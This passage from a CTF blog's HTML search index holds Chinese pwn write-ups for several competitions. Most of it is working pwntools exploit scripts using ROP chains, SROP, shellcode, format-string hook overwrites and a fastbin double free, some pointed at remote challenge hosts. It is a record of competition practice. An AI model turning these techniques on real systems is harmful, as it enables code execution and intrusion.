p = remote(&amp;quot;36.212.170.17&amp;quot;,9999)
elf = ELF(&amp;quot;./sp&amp;quot;)

#gdb.attach(p)
pop_rdi = 0x4012ec
syscall = elf.plt[&#39;syscall&#39;]
sigframe = SigreturnFrame()
sigframe.rdi = 0
sigframe.rsi = 0
sigframe.rdx = 0x404300
sigframe.rcx = 0x300
sigframe.rbp = 0x404400
sigframe.rsp = 0x404300
sigframe.rip = syscall

payload = b&#39;a&#39; * 0x28 + p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
p.send(payload)

sigframe2 = SigreturnFrame()
sigframe2.rdi = 10
sigframe2.rsi = 0x404000
sigframe2.rdx = 0x1000
sigframe2.rcx = 7
sigframe2.rsp = 0x404410
sigframe2.rbp = 0x404500
sigframe2.rip = syscall

shellcode = shellcraft.openat(-100, &#39;flag.txt&#39;, 0, 0)
shellcode += shellcraft.sendfile(1, 3, 0, 50)
shellcode = asm(shellcode)

#pause()
payload = p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2) + p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
p.send(payload)

#pause()
payload = p64(0x404308) + shellcode
p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">tut校赛</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/xyctf/"" data-c="
          &lt;h1 id=&#34;hello_world&#34;&gt;hello_world&lt;/h1&gt;
&lt;p&gt;两次栈溢出，第一次利用字符串的截断泄露出libc地址，第二次拿到shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./vuln&amp;quot;)
#p = remote(&amp;quot;xyctf.top&amp;quot;,44777)
elf = ELF(&amp;quot;./vuln&amp;quot;)
libc = elf.libc

pay = b&#39;a&#39;*0x28
p.sendafter(&amp;quot;name: &amp;quot;,pay)
gdb.attach(p)
base = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x29d90
print(&amp;quot;base = &amp;quot;,hex(base))
sys = base + 0x50D70
sh = base + 0x1D8678
ret = base + 0x0000000000029139
rdi = base + 0x000000000002a3e5
pay += p64(ret) + p64(rdi) + p64(sh) + p64(sys)
gdb.attach(p)
p.sendafter(&amp;quot;please input your name: &amp;quot;,pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;inviisible_flag禁用了orw的orw&#34;&gt;inviisible_flag（禁用了orw的orw）&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1714558976331.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1714559012916.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
程序会执行输入的shellcode，开了沙盒禁用了execve和orw，禁用open可以用openat绕过，禁用read函数可以用pread绕过，后面禁用write我用的测信道爆破，看了wp发现sendfile64 (调用号:0x28)可以直接让一个文件描述符的内容输出到另一个文件描述符上非常适合平替这次的write函数&lt;/p&gt;
&lt;h2 id=&#34;测信道爆破&#34;&gt;测信道爆破&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./vuln&amp;quot;)
#p = remote(&amp;quot;xyctf.top&amp;quot;,44777)
#elf = ELF(&amp;quot;./vuln&amp;quot;)
#libc = elf.libc

#openat(0xffffff9c,flag,0)
#pread(3,0x114514000,0x100,0)
payload = asm(&#39;&#39;&#39;
	mov rax, 0x67616c66
	push rax
	mov rdi, 0xffffff9c
	mov rsi,rsp
	xor rdx,rdx
	mov rax,257
	syscall
	&#39;&#39;&#39;)
payload += asm(shellcraft.pread(3,0x114514000,0x100,0))	

def exp(dis,char):
	pay = payload	
	pay += asm(&#39;&#39;&#39;
	mov dl, byte ptr [rsi+{}]
        mov cl, {}
        cmp cl,dl
        jz loop
        mov al,60
        syscall
        loop:
        jmp loop
	&#39;&#39;&#39;.format(dis,char))
	p.sendafter(&amp;quot;again\n&amp;quot;,pay)

flag = &amp;quot;&amp;quot;

for i in range(len(flag),50):
	sleep(1)
	print(&amp;quot;flag : {}&amp;quot;.format(flag))
	for j in range(0x20,0x80):
		#p = remote(&amp;quot;xyctf.top&amp;quot;,45966)
		p = process(&amp;quot;./vuln&amp;quot;)
		#gdb.attach(p)
		try:
			exp(i,j)
			p.recvline(timeout=1)
			flag += chr(j)
			print(&amp;quot;flag : &amp;quot;,flag)
			log.success(&amp;quot;{} pos : {} success&amp;quot;.format(i,chr(j)))
			p.close()
			break
		except:           
			p.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;sendfile绕过&#34;&gt;sendfile绕过&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./vuln&amp;quot;)
#p = remote(&amp;quot;xyctf.top&amp;quot;,44777)
elf = ELF(&amp;quot;./vuln&amp;quot;)
libc = elf.libc

payload = asm(shellcraft.openat(0xffffff9c,b&amp;quot;flag&amp;quot;,0))	
#payload = asm(shellcraft.openat(-100,b&amp;quot;flag&amp;quot;,0))	
#-100 AT_FDCWD 表示当前目录
payload += asm(shellcraft.pread(3,0x114514000,0x100,0))	
payload += asm(shellcraft.sendfile(1,3,0,0x100))

p.sendafter(&amp;quot;again\n&amp;quot;,payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;static_link&#34;&gt;static_link&lt;/h1&gt;
&lt;p&gt;侥幸拿了个一血😋，静态编译直接生成ropchain&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from ctypes import *
from pwn import *
io = process(&#39;./vuln&#39;)
#io = remote(&amp;quot;xyctf.top&amp;quot;,50075)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
elf = ELF(&#39;./vuln&#39;)


from struct import pack

# Padding goes here
p = b&#39;&#39;

p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000409f8e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000447fe7) # pop rax ; ret
p += b&#39;/bin//sh&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044a465) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000409f8e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000043d1b0) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044a465) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000401f1f) # pop rdi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000409f8e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000451322) # pop rdx ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000043d1b0) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000447fe7) # pop rax ; ret
p += p64(59)
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000401cd4) # syscall

pay = b&#39;&#39;
#
for i in range(len(p)):
        pay += (ord(p[i:i+1])).to_bytes(1)
payload = b&#39;a&#39;*40 + pay
gdb.attach(p)
io.sendafter(b&#39;ret2??\n&#39;, payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;babygift&#34;&gt;BabyGift&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1714560701006.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1714560819606.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
存在栈溢出，查看汇编发现程序结束时rdi指向第二次输入的字符串，控制程序结束时调用printf函数便可以利用格式化字符串泄露出栈地址和libc地址，再调用main函数，控制第二次输入的字符串为/bin/sh，调用system函数即可拿到shell（偶尔printf函数调用失败，多试几次就可）&lt;/p&gt;
&lt;h2 id=&#34;令人疑惑的是&#34;&gt;令人疑惑的是&lt;/h2&gt;
&lt;p&gt;刚开始做时没有泄露栈地址，把栈直接放在bss段了，也调用system函数了，但是调用posix_spawn后创建的子进程就莫名其妙中止了，把posix_spawn的参数和能正常得到shell的参数比较后感觉没啥差异，感觉可能是在创建子进程时对栈的作用使得bss段中某些不能改的东西改了，把栈放回原位就成功拿到shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from ctypes import *
from pwn import *
for i in range(50):
	try:
		p = process(&#39;./vuln&#39;)
		#p = remote(&amp;quot;xyctf.top&amp;quot;,41584)
		context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
		elf = ELF(&#39;./vuln&#39;)

		#gdb.attach(p)
		printf = 0x401080
		ret = 0x000000000040101a
		main = 0x40126A
		pay = b&#39;a&#39;*32
		p.sendafter(&amp;quot;name:\n&amp;quot;,pay)

		payload = b&#39;aa%25$p-%26$p&#39;
		p.sendafter(&amp;quot;Your passwd:\n&amp;quot;,payload.ljust(31,b&#39;b&#39;) + p64(0x404000 + 0x600) + p64(ret) + p64(printf) + p64(main))

		p.recvuntil(b&#39;0x&#39;)
		__libc_start_main = int(p.recv(12),16) - 128
		base = __libc_start_main - 0x29DC0
		print(&amp;quot;base = &amp;quot;,hex(base))
		sys = base + 0x50D70
		
		p.recvuntil(b&#39;0x&#39;)
		stack = int(p.recv(12),16)
		print(&amp;quot;stack = &amp;quot;,hex(stack))

		#gdb.attach(p)
		#one = base + 0xebd43
		payload1 = b&amp;quot;;/bin/sh&amp;quot;*3 + b&#39;a&#39;*7+ p64(stack-0x100+11*8) + p64(0x401288)
		p.sendline(payload1)
		
		
		payload2 = b&amp;quot;/bin/sh\x00&amp;quot;*4 + b&#39;a&#39;*8
		p.sendline(payload2 + p64(ret) + p64(sys))
		p.interactive()
	except:           
		p.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;guestbook&#34;&gt;GuestBook&lt;/h1&gt;
&lt;p&gt;控制rsp最后一位，在栈上提前写好后门函数，很容易栈迁移到后门函数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

for i in range(50):
	try:
		#p = process(&amp;quot;./pwn&amp;quot;)
		p = remote(&amp;quot;xyctf.top&amp;quot;,60462)
		elf = ELF(&amp;quot;./pwn&amp;quot;)
		libc = elf.libc

		#gdb.attach(p)
		sys = 0x40132B
		p.sendlineafter(&amp;quot;index\n&amp;quot;,b&#39;32&#39;)
		p.sendlineafter(&amp;quot;name:\n&amp;quot;,p64(sys)*2)
		p.sendlineafter(&amp;quot;id:\n&amp;quot;,b&#39;32&#39;)
		p.sendlineafter(&amp;quot;index\n&amp;quot;,b&#39;-1&#39;)
		p.interactive()	
	except:           
		p.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;simple_sropsrop和orw&#34;&gt;simple_srop（srop和orw）&lt;/h1&gt;
&lt;p&gt;程序只有一个溢出了很多的read，程序给的read的长度我怕不过，所以先调用read函数在bss段写，同时也可以得知&amp;quot;./flag&amp;quot;字符串的地址,一个sigframe是256个字节（调试出来的）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./vuln&amp;quot;)
p = remote(&amp;quot;192.168.43.159&amp;quot;,62578)
elf = ELF(&amp;quot;./vuln&amp;quot;)

syscall = 0x40129d
bss = 0x404000 + 0x500
srop = 0x401297

#gdb.attach(p)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = bss
sigframe.rsp = bss + 0x10
sigframe.rdx = 0x1000
sigframe.rip = syscall

payload = b&amp;quot;a&amp;quot;*32 + p64(0) + p64(srop) + bytes(sigframe)
p.send(payload)
#pause()
sh = bss
flag = bss + 8
sigframe0 = SigreturnFrame()
sigframe0.rax = constants.SYS_open
sigframe0.rdi = flag
sigframe0.rsi = 0
sigframe0.rsp = bss + 0x10 + 256
sigframe0.rdx = 0
sigframe0.rip = syscall

sigframe1 = SigreturnFrame()
sigframe1.rax = constants.SYS_read
sigframe1.rdi = 3
sigframe1.rsi = bss - 0x100
sigframe1.rsp = bss + 0x10 + 256*2
sigframe1.rdx = 0x100
sigframe1.rip = syscall


sigframe2 = SigreturnFrame()
sigframe2.rax = constants.SYS_write
sigframe2.rdi = 1
sigframe2.rsi = bss - 0x100
sigframe2.rsp = bss + 0x10 + 256*3
sigframe2.rdx = 0x100
sigframe2.rip = syscall

pay = b&amp;quot;/bin/sh\00&amp;quot; + b&amp;quot;./flag\x00\x00&amp;quot; + p64(srop) + bytes(sigframe0) + p64(srop) + bytes(sigframe1) + p64(srop) + bytes(sigframe2)
p.send(pay)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;fmt&#34;&gt;fmt&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1714562839765.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
开局送你libc地址，还有后门函数，然后有个scanf的格式化字符串，可以实现任意地址写，没有栈地址所以没法改返回地址，可以打exit hook，学习链接：&lt;a href=&#34;https://www.cnblogs.com/pwnfeifei/p/15759130.html&#34;&gt;https://www.cnblogs.com/pwnfeifei/p/15759130.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;由此我们可以想到两个方法来-get-shell&#34;&gt;由此我们可以想到两个方法来 get shell&lt;/h2&gt;
&lt;p&gt;1.一个是改 rtld_lock_default_lock_recursive 或 rtld_lock_default_unlock_recursive 为 one_gadget&lt;br&gt;
2.另一个更通用就是改 rtld_lock_default_lock_recursive 和rtld_lock_default_unlock_recursive 为 system ，并且把 _rtld_global._dl_load_lock.mutex的值改为 /bin/sh\x00&lt;/p&gt;
&lt;h2 id=&#34;找hook偏移&#34;&gt;找hook偏移&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;p _rtld_global&lt;/code&gt;命令，但这道题这个命令貌似不太管用，在网上硬找到了偏移，本地2.31的_rtld_global地址：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x7ffff7ffdf60 &amp;lt;_rtld_global+3840&amp;gt;:    0x0000000000000000    0x00007ffff7fd0150
0x7ffff7ffdf70 &amp;lt;_rtld_global+3856&amp;gt;:    0x00007ffff7fd0160    0x0000000000000000
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./vuln&amp;quot;)
#p = remote(&amp;quot;192.168.163.1&amp;quot;,52045)
elf = ELF(&amp;quot;./vuln&amp;quot;)
ld = ELF(&amp;quot;./vuln&amp;quot;)
libc = elf.libc
sys = 4199110#0x4012C6
system = 4198560#0x4010A0
sh = 4202558#0x40203E

gdb.attach(p)
p.recvuntil(b&amp;quot;0x&amp;quot;)
base = int(p.recv(12),16) - 0x61CC0
print(&amp;quot;base = &amp;quot;,hex(base)) #
ld_base = base + 2236416
print(&amp;quot;ld_base = &amp;quot;,hex(ld_base))
_dl_rtld_lock_recursive = ld_base + 0xf60 + 8
_dl_rtld_unlock_recursive = _dl_rtld_lock_recursive + 8
_dl_load_lock = _dl_rtld_unlock_recursive - 0x608
__libc_atexit = base + 0x1ED608

onegadget = [0xe3b2e,0xe3b31,0xe3b34]
one_gadget = base + onegadget[0]

p.sendline(b&amp;quot;%8$lld%9$lldaaaa&amp;quot; + p64(_dl_rtld_lock_recursive) + p64(_dl_load_lock))

pause()
p.sendline(str(system) + &amp;quot; &amp;quot; + str(sh))

p.interactive()

#0xe3b2e execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
#constraints:
#  [r15] == NULL || r15 == NULL || r15 is a valid argv
#  [r12] == NULL || r12 == NULL || r12 is a valid envp

#0xe3b31 execve(https://l1u66.github.io//post-images/1714566464339.png)
#constraints:
#  [r15] == NULL || r15 == NULL || r15 is a valid argv
#  [rdx] == NULL || rdx == NULL || rdx is a valid envp
#
#0xe3b34 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
#constraints:
#  [rsi] == NULL || rsi == NULL || rsi is a valid argv
#  [rdx] == NULL || rdx == NULL || rdx is a valid envp
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;malloc_flag&#34;&gt;malloc_flag&lt;/h1&gt;
&lt;p&gt;额，申请一个0x100的堆块，然后show就有flag....甚至不用写脚本&lt;/p&gt;
&lt;h1 id=&#34;intermittent&#34;&gt;Intermittent&lt;/h1&gt;
&lt;p&gt;程序把输入的shellcode前12个字节每四个字节弄一起&lt;br&gt;
如图&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1714566572863.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1714566393411.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;rep-movsb指令&#34;&gt;rep movsb指令&lt;/h2&gt;
&lt;p&gt;这个指令可以让rsi寄存器的地址开始rcx的字节数据赋值给rdi地址所&lt;br&gt;
指的区域&lt;br&gt;
该题可以通过栈（两个字节，在rdi中写入rdx中的0x114514000），从而写入连续的shellcode&lt;/p&gt;
&lt;h2 id=&#34;mov-movabs区别&#34;&gt;mov movabs区别&lt;/h2&gt;
&lt;p&gt;movabs 和 mov 是 x86 汇编语言中的两条指令，用于将数据从一个位置移动到另一个位置。它们的区别在于操作数的大小和范围。&lt;br&gt;
1.mov 指令只能用于将数据从一个寄存器或内存位置移动到另一个寄存器或内存位置。它可以处理 8 位、16 位、32 位或 64 位的数据。&lt;br&gt;
2.movabs 指令是一个专门用于处理 64 位数据的指令，它用于将 64 位数据直接加载到寄存器中，而不需要使用其他寄存器作为中间传递。这个指令通常用于处理超过 32 位的整数或地址。&lt;br&gt;
因此，movabs 指令主要用于处理 64 位数据，而 mov 指令可以用于处理不同大小的数据。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./vuln&amp;quot;)
#p = remote(&amp;quot;xyctf.top&amp;quot;,44777)
elf = ELF(&amp;quot;./vuln&amp;quot;)
libc = elf.libc

#gdb.attach(p)
shellcode1 = b&#39;\x52\x5F\xF3\xA4&#39;
shellcode = shellcode1+b&amp;quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&amp;quot;

p.send(shellcode.ljust(0x100,b&amp;quot;\x90&amp;quot;))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x0000000000000000:  52       push    rdx
0x0000000000000001:  5E       pop     rsi
0x0000000000000002:  0F 05    syscall 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;极限调用read再次读取shellcode&lt;/p&gt;
&lt;h1 id=&#34;fastfastfastdouble-free&#34;&gt;fastfastfast（double free）&lt;/h1&gt;
&lt;p&gt;2.31的libc，存在uaf考虑fast bin double free,劫持malloc hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./vuln&amp;quot;)
#p = remote(&amp;quot;xyctf.top&amp;quot;,44777)
elf = ELF(&amp;quot;./vuln&amp;quot;)
libc = elf.libc

def add(idx,data):
	p.sendlineafter(&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;1&amp;quot;)
	p.sendlineafter(&amp;quot;idx\n&amp;quot;, str(idx))
	p.sendafter(&amp;quot;content\n&amp;quot;, data)
    	
def dele(idx):
	p.sendlineafter(&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;2&amp;quot;)
	p.sendlineafter(&amp;quot;idx\n&amp;quot;, str(idx))

def view(idx):
	p.sendlineafter(&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;3&amp;quot;)
	p.sendlineafter(&amp;quot;idx\n&amp;quot;, str(idx))
	
#gdb.attach(p)
for i in range(0xf):
	add(i,b&#39;a&#39;*8)
for i in range(8):
	dele(i)
dele(8)
dele(7)
for i in range(7):
	add(i,b&#39;a&#39;*8)
add(9,p64(0x404070))

add(10,b&#39;b&#39;)
add(11,b&#39;c&#39;)
add(12,b&#39;\x00&#39;)

view(12)
base = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;)) - 2021024
print(&amp;quot;base = &amp;quot;,hex(base))
#pause()
onegadget = [0xe3b2e,0xe3b31,0xe3b34]
one_gadget = base + onegadget[1]
malloc_hook = base + (0x7f291e7a2b70-0x7f291e5b6000 )

for i in range(0xf):
	add(i,b&#39;a&#39;*8)
for i in range(8):
	dele(i)
dele(8)
dele(7)

for i in range(7):
	add(i,p64(0))

add(9,p64(malloc_hook))

add(10,b&#39;b&#39;)
add(11,b&#39;c&#39;)
print(&amp;quot;malloc_hook = &amp;quot;,hex(malloc_hook))
#pause()
add(12,p64(one_gadget))
p.sendlineafter(&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;1&amp;quot;)
p.sendlineafter(&amp;quot;idx\n&amp;quot;, str(1))
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">XYCTF</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/nssctf-round21-basic/"" data-c="
          &lt;h1 id=&#34;fmt_checkin&#34;&gt;fmt_checkin&lt;/h1&gt;
&lt;p&gt;经典格式化字符串,存在system函数，将printf的got表换成system的plt表即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from ctypes import *
from pwn import *

#p = process(&#39;./fmt_checkin&#39;)
p = remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28679)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
elf = ELF(&#39;./fmt_checkin&#39;)

#gdb.attach(p)
sys = 0x401265
p.sendlineafter(&amp;quot;send\n&amp;quot;,b&#39;-1&#39;)
p.sendlineafter(&amp;quot;payload\n&amp;quot;,b&amp;quot;%13$p&amp;quot;)
p.recvuntil(b&amp;quot;0x&amp;quot;)
stack = int(p.recv(12),16) - 272 + 16
print(&amp;quot;stack = &amp;quot;,stack)
s1 = stack &amp;amp; 0xffff
p.sendlineafter(&amp;quot;payload\n&amp;quot;,b&amp;quot;%&amp;quot; + str(s1).encode(&amp;quot;utf-8&amp;quot;) + b&amp;quot;c%13$hn&amp;quot;)
p.sendlineafter(&amp;quot;payload\n&amp;quot;,b&amp;quot;%16440c%43$hn&amp;quot;)
p.sendlineafter(&amp;quot;payload\n&amp;quot;,b&amp;quot;%4198624c%11$ln&amp;quot;)
p.sendlineafter(&amp;quot;payload\n&amp;quot;,b&amp;quot;/bin/sh&amp;quot;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;za1yunti4n&#34;&gt;Za1Yunti4n&lt;/h1&gt;
&lt;p&gt;这个题，emmmmm，用C++写的，代码非常多，分析程序发现只要购买到小卖部就可以拿到shell，看三次战队vip就可以把自己的钱变成负数，买到小卖部，不用脚本&lt;/p&gt;
">NSSCTF Round#21 Basic</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/nkctf/"" data-c="
          &lt;h1 id=&#34;leek&#34;&gt;leek&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1711364307553.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现先读取了6个字符，然后使用stdout的实际地址对每个字符取余，信安数基刚学了孙子定理(中国剩余定理)，网上直接有现成的python脚本，然后猜libc版本（恶心至极），利用栈溢出拿到shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import*
from LibcSearcher import *
import math
#p = process(&amp;quot;./leak&amp;quot;)
p = remote(&amp;quot;node.nkctf.yuzhian.com.cn&amp;quot;,31660)
elf = ELF(&amp;quot;./leak&amp;quot;)
libc = elf.libc
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

def Get_Mi(m_list, m):
    M_list = []
    for mi in m_list:
        M_list.append(m // mi)
    return M_list


def Get_resMi(M_list, m_list):
    resM_list = []
    for i in range(len(M_list)):
        resM_list.append(Get_ni(M_list[i], m_list[i])[0])
    return resM_list


def Get_ni(a, b):
    if b == 0:
        x = 1
        y = 0
        q = a
        return x, y, q
    ret = Get_ni(b, a % b)
    x = ret[0]
    y = ret[1]
    q = ret[2]
    temp = x
    x = y
    y = temp - a // b * y
    return x, y, q


def result(a_list, m_list):
    for i in range(len(m_list)):
        for j in range(i + 1, len(m_list)):
            if 1 != math.gcd(m_list[i], m_list[j]):
                print(&amp;quot;不能直接利用中国剩余定理&amp;quot;)
                return
    m = 1
    for mi in m_list:
        m *= mi
    Mi_list = Get_Mi(m_list, m)
    Mi_inverse = Get_resMi(Mi_list, m_list)
    x = 0
    for i in range(len(a_list)):
        x += Mi_list[i] * Mi_inverse[i] * a_list[i]
        x %= m
    return x


if __name__ == &#39;__main__&#39;:
	#gdb.attach(p)
	payload = b&#39;\x65&#39; + b&#39;\x67&#39; + b&#39;\x6b&#39; + b&#39;\x6d&#39; + b&#39;\x71&#39; + b&#39;\x7f&#39;
	p.sendafter(&amp;quot;secret\n&amp;quot;,payload)
	a_list = [1,2,3,4,5,6]
	for i in range(0,6):
		a_list[i] = ord(p.recv(1))
		
	t = ord(p.recv(1))
	m_list = [0x65,0x67,0x6b,0x6d,0x71,0x7f]
	print(a_list)
	print(t)
	print(&amp;quot;最终结果为：&amp;quot;)
	out = result(a_list, m_list)
	while out%0x1000!=0x780:
		out += 0x195682D1EC3
	print(hex(out))
	base = out - libc.sym[&#39;_IO_2_1_stdout_&#39;]
	print(hex(base))
	sys = base + 0x50D70
	sh = base + 0x1D8678
	t += 11*8
	rdi = base + 0x2a3e5
	ret = base + 0x29139
	payload = p64(ret) + p64(rdi) + p64(sh) + p64(sys) + p8(t)
	#pause()
	p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;maimai&#34;&gt;maimai&lt;/h1&gt;
&lt;p&gt;前面有个判断逻辑，随便填了填就能过去，利用格式化字符串泄露cannary和libc地址，利用栈溢出拿到shell，但是拿到shell后发现open被ban掉了，没有打开flag的权限，所以在调用system函数前调用setuid(0)函数提权（关于这一点在begingame中的unhappy那道题中有提及，但是当时复现时看了眼wp得知要用orw，所以直接用orw来做了，没管提权的事，以后再也不看wp做题了🤡）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
#context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
#p = process(&#39;./pwn&#39;)
p = remote(&amp;quot;node.nkctf.yuzhian.com.cn&amp;quot;,32996)

#gdb.attach(p)
p.sendlineafter(b&amp;quot;option:\n&amp;quot;,b&#39;1&#39;)
sleep(1)
for i in range(49):
	p.sendline(b&amp;quot;15.0 SSS+&amp;quot;)
	
p.sendlineafter(&amp;quot;rank.\n&amp;quot;,b&amp;quot;15.0 SS&amp;quot;)
p.sendlineafter(b&amp;quot;option:\n&amp;quot;,b&#39;2&#39;)
#pause()
p.sendlineafter(b&amp;quot;nickname.\n&amp;quot;,b&#39;%11$p&#39;)
p.recvuntil(&amp;quot;0x&amp;quot;)
can = int(p.recv(16),16)
print(&amp;quot;can  =&amp;quot;,hex(can))

p.sendlineafter(b&amp;quot;maimai?\n&amp;quot;,b&#39;aaaaaaaa&#39;)
p.sendlineafter(b&amp;quot;option:\n&amp;quot;,b&#39;2&#39;)
p.sendlineafter(b&amp;quot;nickname.\n&amp;quot;,b&#39;%13$p&#39;)
